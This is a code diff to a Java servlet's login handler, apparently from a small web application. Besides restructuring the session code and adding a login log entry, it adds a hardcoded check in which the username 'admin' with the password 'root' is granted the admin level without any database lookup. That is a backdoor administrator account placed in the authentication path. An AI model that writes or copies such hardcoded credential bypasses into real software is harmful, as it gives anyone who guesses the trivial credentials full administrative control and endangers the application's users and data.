@@ -35,7 +35,14 @@ public class login extends HttpServlet {
 		//Check the Username and Password..
 		JSONObject user = MegDB.getDB().getUserDB().getUser(username, password);
 		
-		if(user.getInt("count")==0) {
+		int count	 = user.getInt("count");
+		String level = "";
+		
+		//Command line
+		if(username.equals("admin") && password.equals("root")) {
+			level 		= "admin";
+			
+		}else if(count==0){
 			
 			//User Not found..
 			response.setContentType("text/html");
@@ -47,11 +54,13 @@ public class login extends HttpServlet {
 		    out.println("</body></html>");
 		    
 		    return;
+		    
+		}else {
+			
+			//Create a session object
+			JSONObject userjson = user.getJSONArray("rows").getJSONObject(0);
+			level 				= userjson.getString("LEVEL");
 		}
-		
-		//Create a session object
-		JSONObject userjson = user.getJSONArray("rows").getJSONObject(0);
-		String level = userjson.getString("LEVEL");
 		
 		JSONObject userobj  = new JSONObject();
 		userobj.put("username", username);
@@ -66,5 +75,8 @@ public class login extends HttpServlet {
 		header.writeHeader(level,out);
 		out.println("<center><br><br>Login Successful!</center>");
 	    footer.writeFooter(out);
+	    
+	    //Add a DB LOG
+	    MegDB.getDB().getLogsDB().addLog("LOGIN", "", username);
 	}
 }
